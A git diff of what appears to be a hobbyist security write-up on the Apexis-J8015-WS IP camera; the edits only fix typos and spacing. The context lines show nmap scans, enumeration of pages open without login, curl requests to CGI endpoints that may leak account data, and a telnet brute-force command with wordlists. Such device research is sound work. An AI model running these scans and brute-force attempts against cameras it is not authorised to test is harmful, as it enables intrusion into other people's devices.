@@ -1,7 +1,7 @@
 # Apexis-J8015-WS
 > 22-06-2021
 
-## Desctiption
+## Description
 The Apexis-J8015-WS is a cheap PTZ IP-CAMERA(Factory settings)
 
 ### I/O
@@ -30,6 +30,7 @@ Let's run some nmap scans
 ```bash
 nmap -O IP-CAMERA
 ```
+
 ```
 MAC Address: 44:33:XX:XX:XX:XX (Shenzhen Bilian electronic)
 Device type: general purpose
@@ -42,6 +43,7 @@ OS details: Linux 2.6.13 - 2.6.32
 ```bash
 nmap -sC -sV IP-CAMERA
 ```
+
 ```
 PORT   STATE SERVICE VERSION
 23/tcp open  telnet  BusyBox telnetd
@@ -58,6 +60,7 @@ Using the `ApexisURLEnum.py` script with the `enumlist.txt` we can found some in
 ```bash
 python3 ApexisURLEnum.py enumlist.txt IP-CAMERA 80
 ```
+
 Here are some valid urls that don't requires login
 ```
 [+] http://IP-CAMERA:80/IPCameramon.htm
@@ -105,16 +108,19 @@ Here are some valid urls that don't requires login
 [+] http://IP-CAMERA:80/index.htm
 [+] http://IP-CAMERA:80/snapshot.htm
 ```
-#### Informataion Gathering
+
+#### Information Gathering
 Now we can see 2 `.cgi` files
 ```
 [+] http://IP-CAMERA:80/get_status.cgi
 [+] http://IP-CAMERA:80/get_tutk_account.cgi
 ```
+
 ##### Camera's Informations
 ```bash
 curl http://IP-CAMERA:80/get_status.cgi
 ```
+
 ```
 var id='4433XXXXXXXX';
 var sys_ver='17.X.X.XX';
@@ -130,10 +136,12 @@ var upnp_status=0;
 var msn_status=0;
 var ddns_host='XXXX.XXXX.org';
 ```
+
 ##### Possible password leak
 ```bash
 curl http://IP-CAMERA:80/get_tutk_account.cgi
 ```
+
 ```
 var ret_tutk_guid='';
 var ret_tutk_user='';
@@ -146,6 +154,7 @@ Now that we have done some research on the IP-CAMERA web server, let's have a lo
 ```bash
 telnet IP-CAMERA 23
 ```
+
 ```
 Trying IP-CAMERA...
 Connected to IP-CAMERA.
@@ -164,6 +173,7 @@ But the credentials could be different. Let's do a bit of brute force oin the ca
 ```bash
 nmap -p 23 --script telnet-brute --script-args userdb=Misc/bruteforce-lists/userlist.txt,passdb=Misc/bruteforce-lists/passlist.txt,telnet-brute.timeout=8s IP-CAMERA
 ```
+
 ```
 Host is up (0.0032s latency).
 
